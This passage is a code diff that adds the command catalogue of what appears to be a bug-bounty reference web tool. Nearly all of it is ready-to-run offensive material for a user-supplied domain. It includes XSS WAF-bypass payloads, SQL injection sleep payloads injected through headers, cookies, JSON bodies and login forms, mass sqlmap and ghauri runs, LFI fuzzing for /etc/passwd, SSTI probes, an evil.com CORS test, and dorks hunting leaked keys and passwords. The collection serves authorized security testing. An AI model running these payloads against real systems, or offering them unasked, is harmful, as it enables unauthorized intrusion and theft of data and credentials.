+         { title: "Logs & errors", description: "Server logs or debug output.", command: `site:{domain} (ext:log OR "stack trace" OR "exception in thread")` },
+         { title: "Directory listings", description: "Open 'Index of' directories.", command: `site:{domain} ("index of" OR "parent directory")` },
+
+         { title: "Source control folders", description: "Exposed VCS metadata.", command: `site:{domain} (inurl:.git OR inurl:.svn OR inurl:.hg)` },
+         { title: "API documentation", description: "Swagger/OpenAPI descriptors.", command: `site:{domain} (inurl:swagger OR inurl:openapi) (ext:json OR ext:yaml OR ext:yml)` },
+         { title: "GraphQL traces", description: "GraphQL consoles or schema clues.", command: `site:{domain} (inurl:graphql OR "IntrospectionQuery")` },
+
+         { title: "Tokens/keys in JSON", description: "Sensitive terms inside JSON files.", command: `site:{domain} ext:json ("api_key" OR "apikey" OR "token" OR "secret")` },
+         { title: "Credentials in docs", description: "Passwords/keys inside documents.", command: `site:{domain} (ext:txt OR ext:pdf OR ext:xls OR ext:xlsx OR ext:doc OR ext:docx) ("password" OR "passwd" OR "AWS_SECRET_ACCESS_KEY" OR "PRIVATE KEY")` },
+
+         { title: "Robots & sitemaps", description: "Crawl directives and sitemaps.", command: `site:{domain} (inurl:robots.txt OR inurl:sitemap.xml)` },
+         { title: "GitHub leaks", description: "Secrets referencing the domain.", command: `site:github.com "{domain}" (".env" OR "AWS_SECRET_ACCESS_KEY" OR "PRIVATE KEY")` },
+         { title: "GitLab leaks", description: "Look for tokens on GitLab.", command: `site:gitlab.com "{domain}" ("token" OR "apikey" OR "password")` },
+         { title: "Public pastes", description: "Domain mentioned in paste sites.", command: `site:pastebin.com "{domain}"` },
+         { title: "Open Trello boards", description: "Project boards referencing the domain.", command: `site:trello.com "{domain}"` },
+
+         { title: "Open redirect candidates", description: "Parameters likely to redirect.", command: `site:{domain} (inurl:redirect= OR inurl:return= OR inurl:url= OR inurl:next= OR inurl:dest=) inurl=http` },
+         { title: "Dev/Stage environments", description: "Artifacts from non-prod envs.", command: `site:{domain} (inurl:dev OR inurl:staging OR inurl:test OR inurl:temp) -inurl:docs` },
+         { title: "Advanced Dork Generator", description: "Open the external advanced Google dork generator.", link: "https://htdark.com/bugbounty/bug-bounty-dork-generator", linkText: "Open generator", linkOnly: true,  featured: true}
+       ]
+     },
+      /* ========== NEW: XSS WAF Bypass Methodology ========== */
+      {
+        name: "XSS WAF Bypass Methodology",
+        icon: "fa-solid fa-user-secret",
+        category: "methodology",
+        commands: [
+         {
+           title: "Dalfox WAF-bypass sweep",
+           description: "Try Dalfox bypass modes against candidate URLs.",
+           command: `cat final.txt | dalfox pipe --waf-bypass --skip-mining-all --silence`
+         },
+         {
+           title: "URL-encoded SVG payload",
+           description: "Useful when literal < and > are blocked.",
+           command: `%3Csvg%20onload%3Dconfirm(1)%3E`
+         },
+         {
+           title: "Double-encoded SVG payload",
+           description: "Bypass naive single-decode filters.",
+           command: `%253Csvg%2520onload%253Dconfirm(1)%253E`
+         },
+         {
+           title: "HTML-encoded IMG onerror",
+           description: "Classic reflection with entity-encoded brackets.",
+           command: `&lt;img src=x onerror=alert(1)&gt;`
+         },
+         {
+           title: "Mixed-case script tag",
+           description: "Case toggling to evade signature checks.",
+           command: `&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;`
+         },
+         {
+           title: "Attribute breakout + script",
+           description: "Close attribute then inject a script block.",
+           command: `&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;`
+         },
+         {
+           title: "HTML5 details/ontoggle",
+           description: "Rarely blocked event handler.",
+           command: `&lt;details open ontoggle=confirm(1)&gt;`
+         },
+         {
+           title: "SVG + property access",
+           description: "Avoid exact 'alert(' signatures.",
+           command: `&lt;svg onload=top&gt;`
+         },
+         {
+           title: "IMG with trailing comment",
+           description: "Bypass attribute sanitizers with a comment.",
+           command: `&lt;img src=x onerror=&quot;alert(1)&quot;//&gt;`
+         },
+         {
+           title: "Href javascript: scheme",
+           description: "When attribute values are controllable.",
+           command: `&lt;a href=javascript:confirm(1)&gt;click&lt;/a&gt;`
+         },
+         {
+           title: "qsreplace probe (encoded)",
+           description: "Replace parameter values with an encoded payload and probe.",
+           command: `cat final.txt | qsreplace '%3Csvg%20onload%3Dconfirm(1)%3E' | httpx -fr -mc 200,403,406 -title -cl | tee xss_waf_bypass_probe.txt`
+         },
+         {
+           title: "Gxss + kxss combo",
+           description: "Detect contexts then try evasive payloads.",
+           command: `echo https://{domain}/ | gau | gf xss | uro | Gxss | kxss --payload '&lt;img src=x onerror=confirm(1)&gt;'`
+         }
+       ]
+     },
+      {
+       name: "SQL Injection Methodology",
+       icon: "fa-solid fa-database",
+       category: "methodology",
+       commands: [
+         {
+           title: "Single-domain SQLi recon",
+           description: "Enumerate and probe tech to spot dynamic frameworks.",
+           command: `subfinder -d {domain} -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'`
+         },
+         {
+          title: "Multi-domain SQLi recon",
+          description: "Use a domain list to find dynamic stacks.",
+          command: `subfinder -dL subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'`
+         },
+         {
+          title: "Find SQLi params (gau)",
+          description: "Gather archived URLs with parameters likely injectable.",
+          command: `echo https://{domain} | gau | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '='`
+        },
+        {
+          title: "Find SQLi endpoints (katana)",
+          description: "Alt approach using katana + passive sources.",
+          command: `echo https://{domain} | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp'`
+        },
+        {
+          title: "Mass SQLi testing (Ghauri)",
+          description: "Queue likely targets and run ghauri in batch.",
+          command: `subfinder -d {domain} -all -silent | gau --threads 50 | uro | gf sqli > sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm`
+        },
+        {
+          title: "Comprehensive SQLi (sqlmap)",
+          description: "Batch scan with sqlmap (risk/level tuned).",
+          command: `subfinder -d {domain} -all -silent | gau | urldedupe | gf sqli > sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent`
+        },
+
+        /* -------- Header-based time-based probes -------- */
+        {
+          title: "Header SQLi (User-Agent, time-based)",
+          description: "Time delay via User-Agent header (MySQL).",
+          command: `curl -s -H 'User-Agent: XOR(if(now()=sysdate(),sleep(5),0))XOR' "https://{domain}"`
+        },
+        {
+          title: "Header SQLi (X-Forwarded-For, time-based)",
+          description: "Inject delay via X-Forwarded-For.",
+          command: `curl -s -H "X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" "https://{domain}"`
+        },
+        {
+          title: "Header SQLi (Referer, time-based)",
+          description: "Trigger sleep via Referer.",
+          command: `curl -s -H "Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'" "https://{domain}"`
+        },
+        {
+          title: "Header SQLi (User-Agent alt.)",
+          description: "Alternative UA header variant with inline payload.",
+          command: `curl -s -H "User-Agent: Mozilla/5.0, (select*from(select(sleep(20)))a) #" "https://{domain}"`
+        },
+        {
+          title: "Header SQLi (User-Agent, GET)",
+          description: "Same UA probe using explicit GET.",
+          command: `curl -H 'User-Agent: XOR(if(now()=sysdate(),sleep(5),0))XOR' -X GET "https://{domain}"`
+        },
+        {
+          title: "Header SQLi (XFF, GET)",
+          description: "X-Forwarded-For variant using GET.",
+          command: `curl -H "X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" -X GET "https://{domain}"`
+        },
+        {
+          title: "Header SQLi (Referer, GET)",
+          description: "Referer variant using GET.",
+          command: `curl -H "Referer: https://{domain}/'+(select*from(select(if(1=1,sleep(20),false)))a)+'" -X GET "https://{domain}"`
+        },
+
+        /* -------- DB-specific time-based payloads -------- */
+        {
+          title: "Oracle time-based payload",
+          description: "Use in Oracle contexts.",
+          command: `SELECT dbms_pipe.receive_message(('a'),10) FROM dual`
+        },
+        {
+          title: "MSSQL time-based payload",
+          description: "WAITFOR DELAY sleep.",
+          command: `WAITFOR DELAY '0:0:10'`
+        },
+        {
+          title: "PostgreSQL time-based payload",
+          description: "Plain pg_sleep.",
+          command: `SELECT pg_sleep(10)`
+        },
+        {
+          title: "MySQL time-based payload",
+          description: "Plain sleep.",
+          command: `SELECT sleep(10)`
+        },
+        {
+          title: "MySQL URL-encoded payload",
+          description: "Useful for header/URL injections.",
+          command: `0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z`
+        },
+        {
+          title: "PostgreSQL CASE time-based",
+          description: "Conditional sleep via CASE.",
+          command: `'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(10)) ELSE '0' END)='1`
+        },
+        {
+          title: "MySQL multi-condition with comments",
+          description: "Bypass via comment obfuscation.",
+          command: `if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR''XOR(if(now()=sysdate(),sleep(10),0))OR'*/`
+        },
+        {
+          title: "Hybrid MySQL+MSSQL time-based",
+          description: "Combined sleep + WAITFOR.",
+          command: `1234 AND SLEEP(10)';WAITFOR DELAY '00:00:05';--`
+        },
+        {
+          title: "Numeric param time-based (MySQL)",
+          description: "Inline payload for numeric params.",
+          command: `paramname=1'-IF(1=1,SLEEP(10),0) AND paramname='1`
+        }
+       ]
+     },
+      {
+       name: "SQL Injection XOR WAF Bypass Methodology",
+       icon: "fa-solid fa-shield-halved",
+       category: "methodology",
+       commands: [
+         {
+           title: "XOR in User-Agent (time-based)",
+           description: "MySQL time delay via User-Agent header (quote-light).",
+           command: `curl -s -I -H "User-Agent: XOR(if(now()=sysdate(),sleep(5),0))XOR" https://{domain}`
+         },
+         {
+           title: "XOR in X-Forwarded-For",
+           description: "Time-based injection through XFF header.",
+           command: `curl -s -I -H "X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(8),0))XOR'Z" https://{domain}`
+         },
+         {
+           title: "XOR in Referer",
+           description: "Time-based injection via Referer header.",
+           command: `curl -s -I -H "Referer: https://{domain}/'XOR(if(now()=sysdate(),sleep(8),0))XOR'" https://{domain}`
+         },
+         {
+           title: "GET param with XOR",
+           description: "Direct GET parameter time delay (+timing output).",
+           command: `curl -s "https://{domain}/item.php?id=0'XOR(if(now()=sysdate(),sleep(8),0))XOR'Z" -m 15 -w " time_total=%{time_total}\\n"`
+         },
+         {
+           title: "URL-encoded XOR payload",
+           description: "Same payload with URL encoding.",
+           command: `curl -s "https://{domain}/item.php?id=0%27XOR(if(now()=sysdate(),sleep(8),0))XOR%27Z" -m 15 -w " time_total=%{time_total}\\n"`
+         },
+         {
+           title: "Mass test normalized params (final.txt)",
+           description: "Use normalized URLs (ending with param=) to append XOR payload and flag slow responses.",
+           command: `cat final.txt | qsreplace "0'XOR(if(now()=sysdate(),sleep(8),0))XOR'Z" | xargs -I@ sh -c 'curl -s -m 15 -o /dev/null -w "@ %{time_total}\\n" "@"' | awk '$NF>8'`
+         },
+         {
+           title: "JSON body with XOR",
+           description: "Time-based injection inside JSON body.",
+           command: `curl -s -m 15 -H "Content-Type: application/json" -d '{\"id\":\"0\\\"XOR(if(now()=sysdate(),sleep(5),0))XOR\\\"Z\"}' https://{domain}/api/search -w " time_total=%{time_total}\\n"`
+         },
+         {
+           title: "Form POST with XOR",
+           description: "Time-based injection via form parameters.",
+           command: `curl -s -m 15 -X POST -d "username=admin&password=0'XOR(if(now()=sysdate(),sleep(8),0))XOR'Z" https://{domain}/login -w " time_total=%{time_total}\\n"`
+         },
+         {
+           title: "Case mixing + comments",
+           description: "Bypass naive filters with mixed case and comments.",
+           command: `curl -s -m 15 "https://{domain}/item.php?id=0'/**/XoR(if(now()=sysdate(),sleep(8),0))/**/XoR'Z" -w " time_total=%{time_total}\\n"`
+         },
+         {
+           title: "Double-encoded XOR",
+           description: "Double URL-encoding to evade pre-filters.",
+           command: `curl -s -m 15 "https://{domain}/item.php?id=0%2527XOR(if(now()=sysdate(),sleep(8),0))XOR%2527Z" -w " time_total=%{time_total}\\n"`
+         },
+         {
+           title: "Cookie header XOR",
+           description: "Inject XOR payload inside Cookie.",
+           command: `curl -s -m 15 -H "Cookie: id=0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z" https://{domain} -w " time_total=%{time_total}\\n"`
+         }
+       ]
+     },
+      /* ===================== Existing categories ===================== */
+      {
+        name: "Subdomain Enumeration",
+        icon: "fa-solid fa-sitemap",
+        category: "subdomain",
+        commands: [
+          {
+            title: "Basic Subdomain Discovery",
+            description: "Discovers subdomains using subfinder with recursive enumeration and saves results to a file.",
+            command: "subfinder -d {domain} -all -recursive > sub{domain}.txt"
+          },
+          {
+            title: "Live Subdomain Filtering",
+            description: "Filters discovered subdomains using httpx and saves the alive ones to a file.",
+            command: "cat sub{domain}.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > sub{domain}_alive.txt"
+          },
+          {
+            title: "Subdomain Takeover Check",
+            description: "Checks for subdomain takeover vulnerabilities using subzy.",
+            command: "subzy run --targets sub{domain}.txt --concurrency 100 --hide_fails --verify_ssl"
+          }
+        ]
+      },
+      {
+        name: "URL Collection",
+        icon: "fa-solid fa-link",
+        category: "url",
+        commands: [
+          {
+            title: "Passive URL Collection",
+            description: "Collects URLs from various sources and saves them to a file.",
+            command: "katana -u sub{domain}_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt"
+          },
+          {
+            title: "Advanced URL Fetching",
+            description: "Collects URLs from various sources and saves them to a file.",
+            command: `echo {domain} | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txt
+katana -u https://{domain} -d 5 | grep '=' | urldedupe | anew output.txt
+cat output.txt | sed 's/=.*/=/' >final.txt`
+          },
+          {
+            title: "GAU URL Collection",
+            description: "Collects URLs using GAU and saves them to a file.",
+            command: `echo {domain} | gau --mc 200 | urldedupe >urls.txt
+cat urls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sort > output.txt
+cat output.txt | sed 's/=.*/=/' >final.txt`
+          }
+        ]
+      },
+      {
+        name: "Sensitive Data Discovery",
+        icon: "fa-solid fa-eye-slash",
+        category: "sensitive",
+        commands: [
+          {
+            title: "Sensitive File Detection",
+            description: "Detects sensitive files on the web server.",
+            command: "cat allurls.txt | grep -E \"\\.xls|\\.xml|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx|\\.txt|\\.zip|\\.tar\\.gz|\\.tgz|\\.bak|\\.7z|\\.rar|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.gz|\\.config|\\.csv|\\.yaml|\\.md|\\.md5\""
+          },
+          {
+            title: "Information Disclosure Dork",
+            description: "Searches for information disclosure vulnerabilities using a dork.",
+            command: "site:*.{domain} (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)"
+          },
+          {
+            title: "Git Repository Detection",
+            description: "Detects Git repositories on the web server.",
+            command: "cat sub{domain}_alive.txt | httpx-toolkit -sc -server -cl -path \"/.git/\" -mc 200 -location -ms \"Index of\" -probe"
+          },
+          {
+            title: "AWS S3 Bucket Finder",
+            description: "Searches for AWS S3 buckets associated with the target.",
+            command: "s3scanner scan -d {domain}"
+          },
+          {
+            title: "API Key Finder",
+            description: "Searches for exposed API keys and tokens in JavaScript files.",
+            command: "cat allurls.txt | grep -E \"\\.js$\" | httpx-toolkit -mc 200 -content-type | grep -E \"application/javascript|text/javascript\" | cut -d' ' -f1 | xargs -I% curl -s % | grep -E \"(API_KEY|api_key|apikey|secret|token|password)\""
+          },
+          {
+            title: "Information Disclosure Scanner",
+            description: "Checks for information disclosure vulnerabilities using a scanner.",
+            command: 'echo {domain} | gau | grep -E "\\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"'
+          }
+        ]
+      },
+      {
+        name: "XSS Testing",
+        icon: "fa-solid fa-code",
+        category: "xss",
+        commands: [
+          {
+            title: "XSS Hunting Pipeline",
+            description: "Collects XSS vulnerabilities using various tools and saves them to a file.",
+            command: "echo https://{domain}/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt"
+          },
+          {
+            title: "XSS with Dalfox",
+            description: "Uses Dalfox to scan for XSS vulnerabilities.",
+            command: "cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence"
+          },
+          {
+            title: "Stored XSS Finder",
+            description: "Finds potential stored XSS vulnerabilities by scanning forms.",
+            command: "cat urls.txt | grep -E \"(login|signup|register|forgot|password|reset)\" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high"
+          },
+          {
+            title: "DOM XSS Detection",
+            description: "Detects potential DOM-based XSS vulnerabilities.",
+            command: "cat js_files.txt | Gxss -c 100 | sort -u | dalfox pipe -o dom_xss_results.txt"
+          },
+          {
+            title: "XSS/SSRF Header Testing",
+            description: "Tests for XSS and SSRF via header injection across discovered hosts.",
+            command: `echo {domain} | assetfinder --subs-only | httprobe | while read url; do xss1=$(curl -s -L "$url" -H 'X-Forwarded-For: xss.yourburpcollaborator' | grep -i xss); xss2=$(curl -s -L "$url" -H 'X-Forwarded-Host: xss.yourburpcollaborator' | grep -i xss); xss3=$(curl -s -L "$url" -H 'Host: xss.yourburpcollaborator' | grep -i xss); xss4=$(curl -s -L "$url" --request-target http://burpcollaborator/ --max-time 2); echo "URL: $url"; echo "Method[1] X-Forwarded-For: xss+ssrf => $xss1"; echo "Method[2] X-Forwarded-Host: xss+ssrf => $xss2"; echo "Method[3] Host: xss+ssrf => $xss3"; echo "Method[4] GET http://xss.yourburpcollaborator HTTP/1.1"; echo ""; done`
+          },
+          {
+            title: "XSS Payload Generator",
+            description: "Open the advanced XSS payload generator in a new tab.",
+            link: "https://htdark.com/bugbounty/xss-payload-generator",
+            linkText: "Open generator",
+            linkOnly: true,
+            featured: true
+          }
+        ]
+      },
+      {
+        name: "LFI Testing",
+        icon: "fa-solid fa-folder-open",
+        category: "lfi",
+        commands: [
+          {
+            title: "LFI Methodology",
+            description: "Tests for Local File Inclusion (LFI) vulnerabilities using various methods.",
+            command: "echo \"https://{domain}/\" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace \"FUZZ\" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr \"root:(x|\\*|\\$[^\\:]*):0:0:\" -v"
+          }
+        ]
+      },
+      {
+        name: "CORS Testing",
+        icon: "fa-solid fa-shield-halved",
+        category: "cors",
+        commands: [
+          {
+            title: "Basic CORS Check",
+            description: "Checks the Cross-Origin Resource Sharing (CORS) policy of a website.",
+            command: "curl -H \"Origin: http://{domain}\" -I https://{domain}/wp-json/"
+          },
+          {
+            title: "CORScanner",
+            description: "Fast CORS misconfiguration scanner that helps identify potential CORS vulnerabilities.",
+            command: "python3 CORScanner.py -u https://{domain} -d -t 10"
+          },
+          {
+            title: "CORS Nuclei Scan",
+            description: "Uses Nuclei to scan for CORS misconfigurations across multiple domains.",
+            command: "cat sub{domain}_alive.txt | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt"
+          },
+          {
+            title: "CORS Origin Reflection Test",
+            description: "Tests for origin reflection vulnerability in CORS configuration.",
+            command: "curl -H \"Origin: https://evil.com\" -I https://{domain}/api/data | grep -i \"access-control-allow-origin: https://evil.com\""
+          }
+        ]
+      },
+      {
+        name: "WordPress Scanning",
+        icon: "fa-brands fa-wordpress",
+        category: "wordpress",
+        commands: [
+          {
+            title: "Aggressive WordPress Scan",
+            description: "Scans a WordPress website for vulnerabilities and saves the results to a file.",
+            command: "wpscan --url https://{domain} --disable-tls-checks --api-token YOUR_TOKEN -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force"
+          }
+        ]
+      },
+      {
+        name: "Network Scanning",
+        icon: "fa-solid fa-network-wired",
+        category: "network",
+        commands: [
+          {
+            title: "Naabu Scan",
+            description: "Scans for open ports and services using Naabu.",
+            command: "naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt"
+          },
+          {
+            title: "Nmap Full Scan",
+            description: "Performs a full port scan using Nmap.",
+            command: "nmap -p- --min-rate 1000 -T4 -A {domain} -oA fullscan"
+          },
+          {
+            title: "Masscan",
+            description: "Scans for open ports and services using Masscan.",
+            command: "masscan -p0-65535 {domain} --rate 100000 -oG masscan-results.txt"
+          }
+        ]
+      },
+      {
+        name: "Parameter Discovery",
+        icon: "fa-solid fa-search",
+        category: "parameters",
+        commands: [
+          {
+            title: "Arjun Passive",
+            description: "Passively discovers parameters using Arjun.",
+            command: "arjun -u https://{domain}/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers \"User-Agent: Mozilla/5.0\""
+          },
+          {
+            title: "Arjun Wordlist",
+            description: "Uses Arjun to discover parameters using a custom wordlist.",
+            command: "arjun -u https://{domain}/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers \"User-Agent: Mozilla/5.0\""
+          }
+        ]
+      },
+      {
+        name: "JavaScript Analysis",
+        icon: "fa-brands fa-js",
+        category: "javascript",
+        commands: [
+          {
+            title: "JS File Hunting",
+            description: "Collects JavaScript files from a website and analyzes them.",
+            command: 'echo {domain} | katana -d 5 | grep -E "\\.js$" | nuclei -t /path/to/nuclei-templates/http/exposures/ -c 30'
+          },
+          {
+            title: "JS File Analysis",
+            description: "Analyzes collected JavaScript files.",
+            command: "cat alljs.txt | nuclei -t /path/to/nuclei-templates/http/exposures/"
+          }
+        ]
+      },
+      {
+        name: "Content Type Filtering",
+        icon: "fa-solid fa-file-code",
+        category: "content",
+        commands: [
+          {
+            title: "Content Type Check",
+            description: "Checks the content type of URLs.",
+            command: `echo {domain} | gau | grep -Eo '(/[^/]+)\\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml\\+xml'`
+          },
+          {
+            title: "JavaScript Content Check",
+            description: "Checks for JavaScript content in URLs.",
+            command: `echo {domain} | gau | grep '\\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'`
+          }
+        ]
+      },
+      {
+        name: "Search Engine Dorks (Shodan/FOFA/etc.)",
+        icon: "fa-solid fa-magnifying-glass",
+        category: "osint",
+        commands: [
+          { title: "Shodan — SSL Certificate CN", description: "Searches for SSL certificates whose CN matches the domain.", command: `ssl.cert.subject.cn:"{domain}" 200` },
+          { title: "Shodan — Hostnames", description: "Finds hosts that include the domain in their hostname.", command: `hostname:"{domain}"` },
+          { title: "FOFA — SSL CN", description: "Certificates where Common Name equals the domain (UI query).", command: `cert.subject.cn="{domain}" && status_code="200"` },
+          { title: "FOFA — Domain/Host", description: "Any host or domain that matches the target.", command: `domain="{domain}" || host="{domain}"` },
+          { title: "Censys — SSL Names", description: "Hosts serving certs that include the domain.", command: `services.tls.certificates.leaf_data.names: "{domain}" AND services.http.response.status_code: 200` },
+          { title: "Censys — HTML Title", description: "Pages with the domain in the HTML title.", command: `services.http.response.html_title: "{domain}"` },
+          { title: "ZoomEye — Cert CN", description: "Finds certificates mentioning the domain.", command: `cert:"{domain}"` },
+          { title: "ZoomEye — Hostname", description: "Hosts with the domain in the hostname.", command: `hostname:"{domain}"` },
+          { title: "BinaryEdge — SSL CN", description: "Certificates whose CN contains the domain.", command: `ssl.subject.common_name:"{domain}" AND http.response.status_code:200` },
+          { title: "Netlas — Cert Subject", description: "Search cert subject common name for the domain.", command: `cert_subject_cn:"{domain}" AND status_code:200` }
+        ]
+      },
+
+      /* ========== NEW: Gather Assets via APIs (OSINT) ========== */
+      {
+        name: "Gather Assets via APIs",
+        icon: "fa-solid fa-cloud-arrow-down",
+        category: "osint",
+        commands: [
+          {
+            title: "VirusTotal — Domain report",
+            description: "Get VT domain report (subdomains, IPs).",
+            command: `https://www.virustotal.com/vtapi/v2/domain/report?apikey=&lt;api_key&gt;&domain={domain}`
+          },
+          {
+            title: "VirusTotal — Extract IPs",
+            description: "IPs from VT domain report.",
+            command: `curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain={domain}&apikey=&lt;api_key&gt;" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'`
+          },
+          {
+            title: "VirusTotal — Extract subdomains",
+            description: "Subdomains from VT domain report.",
+            command: `curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=&lt;api_key&gt;&domain={domain}" | jq -r '.domain_siblings[]'`
+          },
+          {
+            title: "AlienVault OTX — IPs from URLs",
+            description: "Extract IPs from OTX URL list.",
+            command: `curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/{domain}/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'`
+          },
+          {
+            title: "urlscan.io — Extract IPs",
+            description: "IPs from urlscan search results.",
+            command: `curl -s "https://urlscan.io/api/v1/search/?q=domain:{domain}&size=10000" | jq -r '.results[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'`
+          },
+          {
+            title: "Wayback Machine — Historical URLs",
+            description: "Get historical URLs for the domain.",
+            command: `https://web.archive.org/cdx/search/cdx?url={domain}&fl=original&collapse=urlkey`
+          },
+          {
+            title: "Shodan — Favicon hash",
+            description: "Search by favicon hash.",
+            command: `http.favicon.hash:1265477436`
+          },
+          {
+            title: "Shodan — SSL CN to HTTPX",
+            description: "Find by cert CN then probe with httpx-toolkit.",
+            command: `shodan search Ssl.cert.subject.CN:"{domain}" 200 --fields ip_str | httpx-toolkit -sc -title -server -td`
+          },
+          {
+            title: "Nmap — Inspect SSL cert",
+            description: "Grab SSL certificate from a target IP.",
+            command: `nmap --script ssl-cert -p 443 &lt;IP_ADDRESS&gt;`
+          }
+        ]
+      },
+      {
+       name: "SSTI Payloads",
+       icon: "fa-solid fa-fire",
+       category: "ssti",
+       commands: [
+         {
+           title: "SSTI quick probe (GET param)",
+           description: "Replace parameter values with {{7*7}} and look for 49 in the response.",
+           command: `cat final.txt | qsreplace "{{7*7}}" | httpx -mc 200 -fr -silent | grep -E "49" -B1 -A2`
+         },
+         {
+           title: "SSTI quick probe (URL-encoded)",
+           description: "Same as above but URL-encoded for servers that normalize input.",
+           command: `cat final.txt | qsreplace "%7B%7B7*7%7D%7D" | httpx -mc 200 -fr -silent | grep -E "49"`
+         },
+         {
+           title: "SSTI multi-syntax sweep",
+           description: "Try common template syntaxes across discovered URLs.",
+           command: `while read u; do for p in "{{7*7}}" "<%= 7*7 %>" "\\\${7*7}" "#{7*7}" "*{7*7}"; do curl -s "$u$p" | grep -q 49 && echo "[SSTI] $u -> $p"; done; done < final.txt`
+         },
+         {
+           title: "SSTI via POST body",
+           description: "Send {{7*7}} in a form field (q) and detect 49 in the body.",
+           command: `while read u; do curl -s -X POST "$u" -H 'Content-Type: application/x-www-form-urlencoded' --data 'q={{7*7}}' | grep -q 49 && echo "[SSTI] POST $u"; done < sub{domain}_alive.txt`
+         },
+         {
+           title: "SSTI in headers",
+           description: "Inject SSTI into User-Agent and check if it’s rendered server-side.",
+           command: `cat sub{domain}_alive.txt | httpx -H 'User-Agent: {{7*7}}' -fr -mc 200 -silent | grep -E "49" -B1 -A2`
+         },
+         {
+           title: "tplmap quick scan",
+           description: "Automated SSTI checks with tplmap for each normalized URL.",
+           command: `cat final.txt | xargs -I% tplmap -u "%" --timeout=10 -v 2 | tee -a ssti_tplmap_{domain}.txt`
+         },
+         {
+           title: "ffuf wordlist (example)",
+           description: "Fuzz a known SSTI sink using a payload list (adjust the URL/param).",
+           command: `ffuf -u "https://{domain}/index.php?q=FUZZ" -w payloads/ssti.txt -mc 200 -fr -c -t 50 -mr "49"`
+         }
+       ]
+     },
+
+      {
+       name: "FFUF (Request File Method)",
+       icon: "fa-solid fa-file-code",
+       category: "injection",
+       commands: [
+         {
+           title: "LFI with Request File",
+           description: "Uses FFUF to bruteforce LFI via a prepared request file.",
+           command: "ffuf -request lfi -request-proto https -w \"/root/wordlists/offensive payloads/LFI payload.txt\" -c -mr \"root:\""
+         },
+         {
+           title: "XSS with Request File",
+           description: "Uses FFUF to bruteforce XSS via a prepared request file.",
+           command: "ffuf -request xss -request-proto https -w \"/root/wordlists/xss-payloads.txt\" -c -mr \"&lt;script&gt;alert('XSS')&lt;/script&gt;\""
+         }
+        ]
+      }
+    ];
+
+    /* ====== EXTRAS (translated to English) ====== */
+    const extras = [
+      {
+        name: "OSINT & Certificates",
+        icon: "fa-solid fa-id-card-clip",
+        category: "osint",
+        commands: [
+          {
+            title: "crt.sh (CT logs)",
+            description: "Extract subdomains from Certificate Transparency logs.",
+            command: "curl -s 'https://crt.sh/?q=%25.{domain}&output=json' | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u > crtsh_{domain}.txt"
+          },
+          {
+            title: "Certspotter (CT API)",
+            description: "Alternative CT source via API.",
